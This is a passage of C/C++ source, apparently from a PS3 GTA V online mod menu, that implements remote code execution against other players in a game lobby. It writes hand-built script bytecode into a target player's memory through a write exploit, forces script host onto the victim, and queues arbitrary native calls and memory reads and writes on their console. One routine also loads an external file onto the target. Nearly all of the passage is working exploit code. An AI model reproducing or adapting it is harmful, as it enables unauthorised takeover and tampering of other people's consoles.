	short GET_EVENT_DATA_fm = 0x0463;
	dataForOurFunction[21] = 0x04;
	dataForOurFunction[22] = 0x63;
	*/

	//this one re-calls GET_EVENT_DATA on the write if the length is more than 7 to grab the more arguments.
	/*unsigned char dataForOurFunction[] = {0x2D, 0x01, 0x00, 0x06, 0x00, 0x28, 0x10, 0x02, 0x00, 0x10, 0x39, 0x03, 0x6F, 0x38, 0x00, 0x38, 0x03, 0x25, 0x0B, 0x2C, 0x11, 0x00, 0x02, 0x2B, 0x38, 0x03, 0x40, 0x01, 0x2F, 0x43, 0x07, 0xEB, 0x09, 0x56, 0x00, 0x03, 0x2E, 0x01, 0x00, 0x38, 0x03, 0x40, 0x03, 0x2F, 0x2F, 0x39, 0x04, 0x38, 0x03, 0x40, 0x02, 0x2F, 0x6F, 0x08, 0x56, 0x00, 0x53, 0x38, 0x03, 0x40, 0x04, 0x2F, 0x75, 0x0A, 0x56, 0x00, 0x14, 0x6F, 0x38, 0x00, 0x38, 0x03, 0x25, 0x0B, 0x38, 0x03, 0x40, 0x04, 0x2F, 0x75, 0x02, 0x01, 0x2C, 0x11, 0x00, 0x02, 0x2B, 0x6E, 0x39, 0x05, 0x38, 0x05, 0x38, 0x03, 0x40, 0x04, 0x2F, 0x0C, 0x56, 0x00, 0x27, 0x38, 0x03, 0x73, 0x38, 0x05, 0x01, 0x3E, 0x01, 0x3F, 0x2F, 0x38, 0x03, 0x40, 0x03, 0x2F, 0x38, 0x05, 0x72, 0x03, 0x01, 0x30, 0x38, 0x05, 0x3D, 0x01, 0x39, 0x05, 0x38, 0x05, 0x38, 0x03, 0x40, 0x04, 0x2F, 0x0C, 0x06, 0x56, 0xFF, 0xD9, 0x38, 0x04, 0x60, 0x18, 0x47, 0x8D, 0x5F, 0x18, 0x47, 0x8C, 0x6F, 0x01, 0x60, 0x18, 0x47, 0x8C, 0x2E, 0x01, 0x00};
	dataForOurFunction[21] = 0x04;
	dataForOurFunction[22] = 0x63;
	dataForOurFunction[84] = 0x04;//the second one for if it's greater than 7
	dataForOurFunction[85] = 0x63;*/

	/*THIS IS THE OLD ONE THAT IS SUPPORT TO SUPPORT LENGTHS OVER 7 BUT FROM WHAT I CAN TELL, MAX IS ACTUALLY 6*/
	//unsigned char dataForOurFunction[] = { 0x2D, 0x01, 0x00, 0x06, 0x00, 0x28, 0x10, 0x02, 0x00, 0x10, 0x39, 0x03, 0x6F, 0x38, 0x00, 0x38, 0x03, 0x25, 0x0B, 0x2C, 0x11, 0x00, 0x02, 0x2B, 0x38, 0x03, 0x40, 0x01, 0x2F, 0x43, 0x07, 0xEB, 0x09, 0x56, 0x00, 0x03, 0x2E, 0x01, 0x00, 0x38, 0x03, 0x40, 0x03, 0x2F, 0x2F, 0x39, 0x04, 0x38, 0x03, 0x40, 0x02, 0x2F, 0x6F, 0x08, 0x56, 0x00, 0x55, 0x38, 0x03, 0x40, 0x04, 0x2F, 0x75, 0x0A, 0x56, 0x00, 0x16, 0x6F, 0x38, 0x00, 0x38, 0x03, 0x25, 0x0B, 0x38, 0x03, 0x40, 0x04, 0x2F, 0x75, 0x02, 0x01, 0x6F, 0x01, 0x2C, 0x11, 0x00, 0x02, 0x2B, 0x6E, 0x39, 0x05, 0x38, 0x05, 0x38, 0x03, 0x40, 0x04, 0x2F, 0x0C, 0x56, 0x00, 0x27, 0x38, 0x03, 0x73, 0x38, 0x05, 0x01, 0x3E, 0x01, 0x3F, 0x2F, 0x38, 0x03, 0x40, 0x03, 0x2F, 0x38, 0x05, 0x72, 0x03, 0x01, 0x30, 0x38, 0x05, 0x3D, 0x01, 0x39, 0x05, 0x38, 0x05, 0x38, 0x03, 0x40, 0x04, 0x2F, 0x0C, 0x06, 0x56, 0xFF, 0xD9, 0x38, 0x04, 0x60, 0x18, 0x47, 0x8D, 0x5F, 0x18, 0x47, 0x8C, 0x6F, 0x01, 0x60, 0x18, 0x47, 0x8C, 0x2E, 0x01, 0x00 };
	//dataForOurFunction[21] = 0x04;
	//dataForOurFunction[22] = 0x63;
	//dataForOurFunction[86] = 0x04;//the second one for if it's greater than 7
	//dataForOurFunction[87] = 0x63;

	//unsigned char dataForOurFunction[] = { 0x2D, 0x01, 0x00, 0x06, 0x00, 0x28, 0x10, 0x02, 0x00, 0x10, 0x39, 0x03, 0x6F, 0x38, 0x00, 0x38, 0x03, 0x25, 0x0B, 0x2C, 0x11, 0x00, 0x02, 0x2B, 0x38, 0x03, 0x40, 0x01, 0x2F, 0x43, 0x07, 0xEB, 0x09, 0x56, 0x00, 0x03, 0x2E, 0x01, 0x00, 0x38, 0x03, 0x40, 0x03, 0x2F, 0x2F, 0x39, 0x04, 0x38, 0x03, 0x40, 0x02, 0x2F, 0x6F, 0x08, 0x56, 0x00, 0x37, 0x6E, 0x39, 0x05, 0x38, 0x05, 0x38, 0x03, 0x40, 0x04, 0x2F, 0x0C, 0x56, 0x00, 0x29, 0x38, 0x03, 0x73, 0x38, 0x05, 0x75, 0x05, 0x01, 0x3E, 0x01, 0x3F, 0x2F, 0x38, 0x03, 0x40, 0x03, 0x2F, 0x38, 0x05, 0x72, 0x03, 0x01, 0x30, 0x38, 0x05, 0x3D, 0x01, 0x39, 0x05, 0x38, 0x05, 0x38, 0x03, 0x40, 0x04, 0x2F, 0x0C, 0x06, 0x56, 0xFF, 0xD7, 0x38, 0x04, 0x60, 0x18, 0x47, 0x8D, 0x5F, 0x18, 0x47, 0x8C, 0x6F, 0x01, 0x60, 0x18, 0x47, 0x8C, 0x2E, 0x01, 0x00 };
	
	
	
	/*

	unsigned char dataForOurFunction[] = {
		0x2D, 0x01, 0x00, 0x06, 0x00, 0x28, 0x10, 0x02, 0x00, 0x10, 0x39, 0x03, 0x6F, 0x38, 0x00, 0x38, 0x03, 0x25, 0x2C, 0x2C, 0x11, 0x00, 0x02, 0x2B, 0x38, 0x03, 0x40, 0x01, 0x2F, 0x43, 0x07, 0xEB, 0x09, 0x56, 0x00, 0x03, 0x2E, 0x01, 0x00, 0x38, 0x03, 0x40, 0x03, 0x2F, 0x2F, 0x39, 0x04, 0x38, 0x03, 0x40, 0x02, 0x2F, 0x6F, 0x08, 0x56, 0x00, 0x38, 0x6E, 0x39, 0x05, 0x38, 0x05, 0x38, 0x03, 0x40, 0x04, 0x2F, 0x0C, 0x56, 0x00, 0x2A, 0x38, 0x03, 0x73, 0x38, 0x05, 0x25, 0x27, 0x05, 0x01, 0x3E, 0x01, 0x3F, 0x2F, 0x38, 0x03, 0x40, 0x03, 0x2F, 0x38, 0x05, 0x72, 0x03, 0x01, 0x30, 0x38, 0x05, 0x3D, 0x01, 0x39, 0x05, 0x38, 0x05, 0x38, 0x03, 0x40, 0x04, 0x2F, 0x0C, 0x06, 0x56, 0xFF, 0xD6, 0x38, 0x04, 0x60, 0x18, 0x47, 0x8D, 0x5F, 0x18, 0x47, 0x8C, 0x6F, 0x01, 0x60, 0x18, 0x47, 0x8C, 0x2E, 0x01, 0x00
	};
	dataForOurFunction[21] = 0x04;
	dataForOurFunction[22] = 0x63;//0x0463 is the native index
	*/


	//size of 0xBC now
	//now uses   9C6EE func_5947  lengt E2   id 188 
	unsigned char dataForOurFunction[] = { 0x01, 0x00, //patch the last 2 bytes of the previous one
		0x2D, 0x01, 0x00, 0x06, 0x00, 0x28, 0x10, 0x02, 0x00, 0x10, 0x39, 0x03, 0x28, 0x10, 0x02, 0x00, 0xB5, 0x39, 0x04, 0x6F, 0x38, 0x00, 0x38, 0x03, 0x25, 0x2C, 0x2C, 0x11, 0x00, 0x02, 0x2B, 0x38, 0x03, 0x40, 0x01, 0x2F, 0x43, 0x07, 0xEB, 0x09, 0x56, 0x00, 0x03, 0x2E, 0x01, 0x00, 0x38, 0x03, 0x40, 0x02, 0x2F, 0x6F, 0x08, 0x56, 0x00, 0x38, 0x6E, 0x39, 0x05, 0x38, 0x05, 0x38, 0x03, 0x40, 0x04, 0x2F, 0x0C, 0x56, 0x00, 0x2A, 0x38, 0x03, 0x73, 0x38, 0x05, 0x25, 0x27, 0x05, 0x01, 0x3E, 0x01, 0x3F, 0x2F, 0x38, 0x03, 0x40, 0x03, 0x2F, 0x38, 0x05, 0x72, 0x03, 0x01, 0x30, 0x38, 0x05, 0x3D, 0x01, 0x39, 0x05, 0x38, 0x05, 0x38, 0x03, 0x40, 0x04, 0x2F, 0x0C, 0x06, 0x56, 0xFF, 0xD6, 0x43, 0x07, 0xEB, 0x38, 0x04, 0x30, 0x38, 0x03, 0x40, 0x02, 0x2F, 0x6E, 0x08, 0x56, 0x00, 0x2F, 0x6E, 0x39, 0x05, 0x38, 0x05, 0x25, 0x2B, 0x0C, 0x56, 0x00, 0x24, 0x38, 0x03, 0x40, 0x03, 0x2F, 0x38, 0x05, 0x72, 0x03, 0x01, 0x2F, 0x38, 0x04, 0x38, 0x05, 0x6F, 0x01, 0x3E, 0x01, 0x3F, 0x30, 0x38, 0x05, 0x3D, 0x01, 0x39, 0x05, 0x38, 0x05, 0x25, 0x2B, 0x0C, 0x06, 0x56, 0xFF, 0xDC, 0x6F, 0x38, 0x04, 0x25, 0x2C, 0x6D, 0x2C, 0x10, 0x00, 0x03, 0x2E, 0x01, 0x00
	};
	dataForOurFunction[28+2] = 0x04;
	dataForOurFunction[29+2] = 0x63;//0x463 GET_EVENT_DATA
	dataForOurFunction[183+2] = 0x00;
	dataForOurFunction[184+2] = 0x2F;//0x2F TRIGGER_SCRIPT_EVENT

	if (i < sizeof(dataForOurFunction)) {
		int value = *(int*)(&dataForOurFunction[i]);
		writeCodeToPlayerRCE(0x9C6EE-2/*0x9C5B0*/ + i, value, false);//false so this uses the normal exploit write
		runlater::runlater(10, setupPlayerRCEOnTriggerScript_callback1, i + 4);
	}
	else {
		print2("~g~Finished!",10000);
		readyForFinalRCE = true;
	}
}


int rceReturnValues[43];
bool hasRceReturnValues = false;

void* getRCEReturnValues() {
	if (hasRceReturnValues) {
		hasRceReturnValues = false;
		return rceReturnValues;
	}
	return 0;
}

void logEventData(int eventID) {
	unsigned int cEventNetwork = call<unsigned int>(0x4283EC)(1, eventID, "GET_EVENT_AT_INDEX");
	if (cEventNetwork != 0) {
		int cEventNetworkId = call<int>(*(int*)*(int*)((*(int*)cEventNetwork)+ 0x10))();
		char* eventClassName = (char*)*(int*)((*(int*)((*(int*)cEventNetwork) - 0x4)) + 0x4);
		if (cEventNetworkId != 0xA6)//normal script event... too many of them
			printf("Received event: 0x%X 0x%X %s\n", cEventNetworkId, *(int*)cEventNetwork, eventClassName);
	}
}

void OnPlayerLeave(int playerID) {
	modifiedPlayerEbootsArray[playerID] = false;
}
void OnPlayerJoin(int playerID) {
	CPlayerInfo *info = getCNetGamePlayer(playerID)->playerInfo;
	if (info != 0) {
		//printf("Adding met player %s\n",info->name);
		addMetPlayer(info->name);
	}
	
}

bool players_in_lobby[18] = {false};
void PlayerJoinLeaveLogger() { 
	if (I_AM_ONLINE) {
		for (int i = 0; i < 18; i++) {
			bool player_in_lobby = PLAYER_VALID(i);
			if (player_in_lobby != players_in_lobby[i]) {
				players_in_lobby[i] = player_in_lobby;
				//they left or joined, time to reset
				if (player_in_lobby == false) {//they just left
					OnPlayerLeave(i);
				}
				if (player_in_lobby == true) {
					//they just joined
					if (i != PLAYER::PLAYER_ID()) {
						OnPlayerJoin(i); 
					}
				}
			}
		}
	}

}

void cEventNetworkFeed() {

	PlayerJoinLeaveLogger();

	int evid = 0;

	while (evid < SCRIPT::GET_NUMBER_OF_EVENTS(1))
	{

		//to find any event id in ida just do:
		/*
		li        %r3, EVENT_ID
		blr
		*/
		//and search that to get the CEventNetwork class that returns that value


		//logEventData(evid);


		int type = SCRIPT::GET_EVENT_AT_INDEX(1, evid);//event type

		switch (type) {
			/*case 163:
			{*/
			//r3 = 163; in mods.h to find the freeze
			//printf("Got event 163!\n");
			/*
			case 163:
				if (get_event_data(1, iVar2, &uVar0, 21))
				{
					func_662(&uVar0, 1);
				}
				break;
			*/
			/*int vars[21];
			SCRIPT::GET_EVENT_DATA(1, evid, vars, 21);
			printf("User: %s %s mine:%i playerid:%i insesh:%i\n", NETWORK::NETWORK_MEMBER_ID_FROM_GAMER_HANDLE((Any)&vars), NETWORK::NETWORK_GET_GAMERTAG_FROM_HANDLE((int*)vars), NETWORK::NETWORK_ARE_HANDLES_THE_SAME((Any)&vars, PlayerMods::v_3(PLAYER::PLAYER_ID())), NETWORK::NETWORK_GET_PLAYER_FROM_GAMER_HANDLE((Any)&vars), NETWORK::NETWORK_IS_GAMER_IN_MY_SESSION((Any)&vars));



			break;
		}*/
#ifdef loggerleavejoinbyevent
		case 0x96://CEventNetworkPlayerJoinScript
		case 0x97://CEventNetworkPlayerLeftScript  151
		{
			//Received event: 0x97 0x18B9658 29CEventNetworkPlayerLeftScript called on player kick

			int vars[44];
			vars[10] = 20;//imm 10
			SCRIPT::GET_EVENT_DATA(1, evid, vars, 44);
			int threadArraySize = vars[9];//imm 9

			for (int i = 0; i < threadArraySize; i++) {
				int index = 11 + i;//array is imm 10, so index 0 is imm 11, sub 1 is 10??? fuck it
				int threadID = vars[index];
				if (threadID == freemodeScriptGtaThread->threadID) {

					int playerid = vars[6];
					if (playerid < 18 && playerid > -1) {

						if (type == 0x97) {//leave
							if (getCNetGamePlayer(playerid) == 0) {
								//they left already because cnet doesn't exist
								//snprintf(global_temporary_buf, sizeof(global_temporary_buf), "Player %s left!", vars);
								//print2(global_temporary_buf);
								modifiedPlayerEbootsArray[playerid] = false;
							}
						}
						if (type == 0x96) {//join
							//snprintf(global_temporary_buf, sizeof(global_temporary_buf), "Player %s joined!", vars);
							//print2(global_temporary_buf);
							//modifiedPlayerEbootsArray[playerid] = false;
						}


					}
				}
			}//array is size of 11
			 //0x47726F74 0x685F3837 0x0 0x78 0x74 0x0 0x6 0xFFFFFFFF 0x0/*imm 9*/ 0xA/*imm 10*/ 0x0 0x4C 0x4B 0x4A 0x4D 0x48 0x4E 0x46 0x43 0x3F 0x50 0x0 0x0 0x0 0x70C 0x0 0x0 0x0 0x1CFDAF8 0x0 0x1CFFD18 0x2247726 0xF74685F3 0x83700000 0x0 0x0 0x61397 0x36570733 0x30001000 0x0 0xD9A08 0x50A00000 0x1C85330 0x0
			/*printf("PLS: ");
			for (int i = 0; i < 44; i++) {
				printf("0x%X ",vars[i]);
			}
			printf("\n");*/
			//TRAP();
			//printf("Selected player: 0x%X\n",selectedPlayer);

			//modifiedPlayerEbootsArray[index] = value;

			break;
		}
#endif

			
		/*
		case 193://CEventNetworkPedLeftBehind
		{
			int var;
			SCRIPT::GET_EVENT_DATA(1, evid, &var, 1);//the last 2 is 2 for some reason...
			//var now equals player ped id
			for (int i = 0; i < 18; i++) {
				if (PLAYER::GET_PLAYER_PED(i) == var) {
					printf("Player left: %i\n",i);
				}
			}
				break;
		}*/
		case 166://trigger script event

			

			//int eventType = 0;

			//SCRIPT::GET_EVENT_DATA(1, evid, &eventType, 2);
			//switch (eventType)
			//{
				//case 2027:
				//printf("Got event 2027!");
				int vars[44];
				SCRIPT::GET_EVENT_DATA(1, evid, vars, 44);

				//printf("Got an event 166! evid: %i\n",vars[0]);

				if (vars[0] == 2027)
				{
					//printf("Received data!\n");
					for (int i = 1; i < 44; i++) {
						rceReturnValues[i - 1] = vars[i];
					}
					hasRceReturnValues = true;
				}
				break;

			//}
		}
		evid++;
	}
}

//finished these functions
void setupPlayerRCEOnTriggerScript_callback(int i) {

	//0x9C6EE is the function start but to start on 4's we will start at 0x9C6EC
	//115 now, must get to 116 (0x74) so add 1 more byte
	//0x9C6EC + 0x73 = 0x9C75F
	//04 63 is the GET_EVENT_DATA index in the freemode script
	//unsigned char dataForOurFunction[] = {0x01, 0x00, 0x2D, 0x01, 0x00, 0x12, 0x04, 0x66, 0x75, 0x6E, 0x63, 0x6F, 0x38, 0x00, 0x37, 0x03, 0x25, 0x0B, 0x2C, 0x11, 0x04, 0x63/*0463 GET_EVENT_DATA*/, 0x2B, 0x37, 0x03, 0x40, 0x0A, 0x2F, 0x43, 0x07, 0xEB, 0x09, 0x56, 0x00, 0x03, 0x2E, 0x01, 0x00, 0x37, 0x03, 0x40, 0x02, 0x2F, 0x28, 0x01, 0xC8, 0x53, 0x30, 0x70, 0x37, 0x0E, 0x33, 0x37, 0x0E, 0x39, 0x10, 0x37, 0x03, 0x40, 0x03, 0x2F, 0x37, 0x03, 0x40, 0x04, 0x2F, 0x37, 0x03, 0x40, 0x05, 0x2F, 0x37, 0x03, 0x40, 0x06, 0x2F, 0x37, 0x03, 0x40, 0x07, 0x2F, 0x37, 0x03, 0x40, 0x08, 0x2F, 0x37, 0x03, 0x40, 0x09, 0x2F, 0x38, 0x10, 0x6C, 0x39, 0x11, 0x38, 0x11, 0x60, 0x18, 0x47, 0x8D, 0x5F, 0x18, 0x47, 0x8C, 0x6F, 0x01, 0x60, 0x18, 0x47, 0x8C, 0x2E, 0x01, 0x00, 0x24/*this last one doesn't really matter because it's not called*/};

	//this one calls a native with 7 arguments, but uses local variable
	//unsigned char dataForOurFunction[] = {0x01, 0x00, 0x2D, 0x01, 0x00, 0x0F, 0x04, 0x66, 0x75, 0x6E, 0x63, 0x6F, 0x38, 0x00, 0x37, 0x03, 0x25, 0x0B, 0x2C, 0x11, /*0x9C6EC+20*/0x00, /*0x9C6EC+21*/0x00, 0x2B, 0x37, 0x03, 0x40, 0x0A, 0x2F, 0x43, 0x07, 0xEB, 0x09, 0x56, 0x00, 0x03, 0x2E, 0x01, 0x00, 0x37, 0x03, 0x40, 0x03, 0x2F, 0x37, 0x03, 0x40, 0x04, 0x2F, 0x37, 0x03, 0x40, 0x05, 0x2F, 0x37, 0x03, 0x40, 0x06, 0x2F, 0x37, 0x03, 0x40, 0x07, 0x2F, 0x37, 0x03, 0x40, 0x08, 0x2F, 0x37, 0x03, 0x40, 0x09, 0x2F, 0x2C, 0x1D, 0x00, 0x01, 0x39, 0x0E, 0x38, 0x0E, 0x60, 0x18, 0x47, 0x8D, 0x5F, 0x18, 0x47, 0x8C, 0x6F, 0x01, 0x60, 0x18, 0x47, 0x8C, 0x2E, 0x01, 0x00};

	//this one same as above but uses arbitrary address in the array
	unsigned char dataForOurFunction[] = { /*0x01, 0x00, */0x2D, 0x01, 0x00, 0x05, 0x00, 0x28, 0x10, 0x02, 0x00, 0x10, 0x39, 0x03, 0x6F, 0x38, 0x00, 0x38, 0x03, 0x25, 0x0B, 0x2C, 0x11, 0x00, 0x02, 0x2B, 0x38, 0x03, 0x40, 0x0A, 0x2F, 0x43, 0x07, 0xEB, 0x09, 0x56, 0x00, 0x03, 0x2E, 0x01, 0x00, 0x38, 0x03, 0x40, 0x03, 0x2F, 0x38, 0x03, 0x40, 0x04, 0x2F, 0x38, 0x03, 0x40, 0x05, 0x2F, 0x38, 0x03, 0x40, 0x06, 0x2F, 0x38, 0x03, 0x40, 0x07, 0x2F, 0x38, 0x03, 0x40, 0x08, 0x2F, 0x38, 0x03, 0x40, 0x09, 0x2F, 0x2C, 0x1D, 0x00, 0x03, 0x39, 0x04, 0x38, 0x04, 0x60, 0x18, 0x47, 0x8D, 0x5F, 0x18, 0x47, 0x8C, 0x6F, 0x01, 0x60, 0x18, 0x47, 0x8C, 0x2E, 0x01, 0x00 };

	short GET_EVENT_DATA_fm = 0x0463;
	dataForOurFunction[23-2] = 0x04;
	dataForOurFunction[24-2] = 0x63;

	//now it is 0x74 
	//will be a total of 0x1D (29) writes
	/*for (int i = 0; i < sizeof(dataForOurFunction); i+=4) {
		int value = *(int*)(&dataForOurFunction[i]);
		writeCodeToPlayerRCE(0x9C6EC+i,value);
	}*/
	if (i < sizeof(dataForOurFunction)) {
		int value = *(int*)(&dataForOurFunction[i]);
		writeCodeToPlayerRCE(0x9C5B0/*0x9C6EC*/ + i, value, false);//false so it uses the normal write address exploit
		runlater::runlater(10, setupPlayerRCEOnTriggerScript_callback, i + 4);
	}
	else {
		//print2("Finished!");
		setupPlayerRCEOnTriggerScript_callback1(0);//set up the read/write function code
		//readyForFinalRCE = true;
	}
}
void setupPlayerRCEOnTriggerScript() {
	if (hasRCEScriptbennSetup == false) {
		print2("Please do 'Phase 4' first!");
		return;
	}
	//size of 113 0x71
	unsigned char data[] = { 0x2D, 0x01, 0x00, 0x12, 0x04, 0x66, 0x75, 0x6E, 0x63, 0x6F, 0x38, 0x00, 0x37, 0x03, 0x25, 0x0B, 0x2C, 0x11, 0x00, 0x00, 0x2B, 0x37, 0x03, 0x40, 0x0A, 0x2F, 0x43, 0x07, 0xEB, 0x09, 0x56, 0x00, 0x03, 0x2E, 0x01, 0x00, 0x37, 0x03, 0x40, 0x02, 0x2F, 0x28, 0x01, 0xC8, 0x53, 0x30, 0x70, 0x37, 0x0E, 0x33, 0x37, 0x0E, 0x39, 0x10, 0x37, 0x03, 0x40, 0x03, 0x2F, 0x37, 0x03, 0x40, 0x04, 0x2F, 0x37, 0x03, 0x40, 0x05, 0x2F, 0x37, 0x03, 0x40, 0x06, 0x2F, 0x37, 0x03, 0x40, 0x07, 0x2F, 0x37, 0x03, 0x40, 0x08, 0x2F, 0x37, 0x03, 0x40, 0x09, 0x2F, 0x38, 0x10, 0x6C, 0x39, 0x11, 0x38, 0x11, 0x60, 0x18, 0x47, 0x8D, 0x5F, 0x18, 0x47, 0x8C, 0x6F, 0x01, 0x60, 0x18, 0x47, 0x8C, 0x2E, 0x01, 0x00 };
	int garbageval = 0;
	getRCEFunctionCallback(&garbageval);//sync to initial value
	//writeCodeToPlayerRCE
	print2("Started...", 60000);
	setupPlayerRCEOnTriggerScript_callback(0);

}

void patchNegativeRCEBug(int player) {
	/*
	*(int*)(*(int*)((int)N4rage10scrProgramEscriptFreemode+0x8) + 0x124)  = file + 0x14010

	*(int*)(*(int*)(0x35420000+0x8) + 0x4*i)+0x0
	*(int*)(*(int*)((int)N4rage10scrProgramEscriptFreemode+0x8) + 0x00)  = file + 0x138010
	*(int*)(*(int*)((int)N4rage10scrProgramEscriptFreemode+0x8) + 0x04)  = file + 0x134010
	*(int*)(*(int*)((int)N4rage10scrProgramEscriptFreemode+0x8) + 0x08)  = file + 0x130010
	*(int*)(*(int*)((int)N4rage10scrProgramEscriptFreemode+0x8) + 0x0C)  = file + 0x12C010

	soo...
	*(int*)(*(int*)((int)N4rage10scrProgramEscriptFreemode+0x8) + 0x124) + (0x9C3D8-0x14010) = 0xCF428C6F;
	*(int*)(*(int*)((int)N4rage10scrProgramEscriptFreemode+0x8) + 0x124) + (0x9C3EC-0x14010) = 0x000F5500;

	slight hand
	*(int*)(*(int*)(0x35420000+0x8)+0x124) + (0x9C3D8-0x14010) = 0xCF428C6F;
	*(int*)(*(int*)(0x35420000+0x8)+0x124) + (0x9C3EC-0x14010) = 0x000F5500;


	*(int*)(*(int*)(0x376A0000+0x8)+0x168) = file + 0x9C010

	so these should work
	*(int*)(*(int*)(0x376A0000+0x8)+0x168) + (0x9C3D8-0x9C010) = 0xCF428C6F;
	*(int*)(*(int*)(0x376A0000+0x8)+0x168) + (0x9C3EC-0x9C010) = 0x000F5500;

	*/

	playerToDoRCEOn = player;
	//echoStartValueOfItAddress(findRCEV5StartValuePlayer,0,findAddresscVehicleOnPlayer_callbackA);
	patchNegativeRCEBugScriptCodeOnSelf();
}

void injectRPFOnPlayer_callback(int value) {

	//0x1D5A770 = 9
	//0x1C7E464 = v
	//0x1C7E3B4 = v
}
void injectRPFOnPlayer(int player) {
	executeRCEV5String(player, 0x181F00C, "/dev_usb000/update.rpf", true);
	executeRCEV5Address(player, 0x1D5A770, 9);
	executeRCEV5Address(player, 0x1C7E464, 1);
	executeRCEV5Address(player, 0x1C7E3B4, 1);
}

/*void findRCEV5BaseByNameA(int player) {
	addressOfTheExploitArray = 0x33A93FE4;
	for (int i = -recv5searchRange; i < recv5searchRange; i++) {
		testFindPlayersName(player,i);
	}
	addOnToBaseExploitAddress = 0;
}
void findRCEV5BaseByNameB(int player) {
	addressOfTheExploitArray = 0x3399CC54;
	for (int i = -recv5searchRange; i < recv5searchRange; i++) {
		testFindPlayersName(player,i);
	}
	addOnToBaseExploitAddress = 0;
}*/


void testExecuteRCEV3() {
	executeRCEV3(0, 1666037, 5);
}
void testExecuteRCEV3p2() {
	executeRCEV3(0, 1666100, 5);
}

void testTheGlobals(int i) {
	switch (i) {
	case 0:
		testGlobalBruteForce(2387877, 302);//crash
	case 1:
		testGlobalBruteForce(2388179, 116);
	case 2:
		testGlobalBruteForce(2378765, 1689);
	case 3:
		testGlobalBruteForce(2388295, 641);
	case 4:
		testGlobalBruteForce(2388936, 210);
	case 5:
		testGlobalBruteForce(2389146, 225);
	case 6:
		testGlobalBruteForce(2389371, 330);
	case 7:
		testGlobalBruteForce(2389701, 329);
	case 8:
		testGlobalBruteForce(2390030, 171);//this one works wiithout freemode script crash, and all the ones below too
	case 9:
		testGlobalBruteForce(2468303, 76);
	case 10:
		testGlobalBruteForce(1572928, 238);
	case 11:
		testGlobalBruteForce(1588610, 19);
	case 12:
		testGlobalBruteForce(1666034, 35);
	case 13:
		testGlobalBruteForce(1673856, 268);
	case 14:
		testGlobalBruteForce(1591180, 4);
	}
}


//#endif



__NAKED int getTLS() {
	__asm("mr %r3, %r13");
	__asm("blr");
}
__NAKED int setTLS(int r3) {
	__asm("mr %r13, %r3");
	__asm("blr");
}

namespace rceThread {

	/*
	RCE Definitions:
	bool getRCEFunctionCallback(int *value);
	void callRCEReadFunction(int addressToRead);
	void callRCEWriteFunction(int addressToWriteTo, int size, int arr[]);//max size of 7
	void callRCEFunction(unsigned int native, int r3 = 0, int r4 = 0, int r5 = 0, int r6 = 0, int r7 = 0, int r8 = 0, int r9 = 0);

	*/
	/*void setGTAInTLS() {
		int tls = getTLS();
		printf("TLS: 0x%X\n",tls);
		*(int*)(tls-0x6FA0) = (int)freemodeScriptGtaThread;
	}*/


	bool abortAllCalls = false;

	namespace hooked {
		bool queCallNative = false;
		bool queRead32 = false;
		bool queWrite = false;
		unsigned int native;
		int r3, r4, r5, r6, r7, r8, r9;
		int address;
		int* arr;
		int size;

		char* printText = "";
		bool printTextBool = false;
		int printTextTime = 1000;

		void loopInHook() {

			cEventNetworkFeed();

			if (!IS_LOADED_INTO_LOBBY) {
				readyForFinalRCE = false;
			}

			static int timerOnRequestHost = 0;

			//printf("Wow %i\n", queCallNative);
			if (readyForFinalRCE == true && PLAYER_VALID(playerToDoRCEOn)) {
				//we are actually in rce so do this
				int host = getHostOfFreemodeScript();
				if (host != playerToDoRCEOn) {
					if (timerOnRequestHost <= 0) {
						giveHostToPlayer(playerToDoRCEOn);
						timerOnRequestHost = 50;
					}
					else
						timerOnRequestHost--;
					return;//just return here and wait until next and hopefully I am host again...
				}
				else {
					timerOnRequestHost = 0;
				}
			}
			//printf("Wee\n");

			if (printTextBool) {
				print2(printText, printTextTime);
				printTextBool = false;
			}
			if (queCallNative) {
				callRCEFunction(native, r3, r4, r5, r6, r7, r8, r9);
				//printf("Que'd call native\n");
				queCallNative = false;
			}
			if (queRead32) {
				callRCEReadFunction(address);
				queRead32 = false;
			}
			if (queWrite) {
				callRCEWriteFunction(address, size, arr);
				queWrite = false;
			}
		}

	};

	//this function is to be called by the thread
	void print(char* text, int time = 2000) {
		if (abortAllCalls)
			return;
		hooked::printTextTime = time;
		hooked::printText = text;
		hooked::printTextBool = true;
		int counter = 0;
		while (hooked::printTextBool == true) { if (counter > 3000) { print3("ERROR: TIMEOUT 000\n", 100000); break; } sleep(1); counter++; /*printf("%i%i ", hooked::printTextBool, counter);*/ };//wait until it has been called
	}


	//main function definitions for separate thread (ie sync not async)
	int callNative(unsigned int native, int r3 = 0, int r4 = 0, int r5 = 0, int r6 = 0, int r7 = 0, int r8 = 0, int r9 = 0) {
		if (abortAllCalls)
			return 0;
		//setGTAInTLS();
		//sleep(100);//sleep 100 ms
		//callRCEFunction(native,r3,r4,r5,r6,r7,r8,r9);
		hooked::native = native;
		hooked::r3 = r3;
		hooked::r4 = r4;
		hooked::r5 = r5;
		hooked::r6 = r6;
		hooked::r7 = r7;
		hooked::r8 = r8;
		hooked::r9 = r9;
		hooked::queCallNative = true;
		int counter = 0;
		//printf("About to wait for the 001\n");
		while (hooked::queCallNative == true) { sleep(1); counter++; if (counter > 10000) { print3("ERROR: TIMEOUT 001\n",100000); break; } };//wait for it to actually be called from the hook
		
		counter = 0;
		//while (getRCEFunctionCallback(&ret) == false) { sleep(1); counter++; if (counter > 10000) { print3("ERROR: TIMEOUT 004\n", 100000); break; } }
		int* data = 0;
		//printf("About to wait for the 111\n");
		while ((data = (int*)getRCEReturnValues()) == 0) { sleep(1); counter++; if (counter > 10000) { print3("ERROR: TIMEOUT 111\n", 100000); break; } };//first wait for the receive from the event of the write part that happens on the call for natives
		
		int ret = 0;
		counter = 0;
		//printf("About to wait for the 002\n");
		while (getRCEFunctionCallback(&ret) == false) { sleep(1); counter++; if (counter > 10000) { print3("ERROR: TIMEOUT 002\n", 100000); break; } }
		return ret;
	}

	int *read43(int address) {
		if (abortAllCalls)
			return 0;
		getRCEReturnValues();//clear any previous requests that may be left over due to lazy coding...
		//setGTAInTLS();
		//sleep(100);//sleep 100 ms
		//callRCEReadFunction(address);
		hooked::address = address;
		hooked::queRead32 = true;
		int counter = 0;
		while (hooked::queRead32 == true) { sleep(1); counter++; if (counter > 10000) { print3("ERROR: TIMEOUT 003\n", 100000); break; } };//pause until it is sent
		int ret = 0;
		counter = 0;
		//while (getRCEFunctionCallback(&ret) == false) { sleep(1); counter++; if (counter > 10000) { print3("ERROR: TIMEOUT 004\n", 100000); break; } }
		int* data = 0;
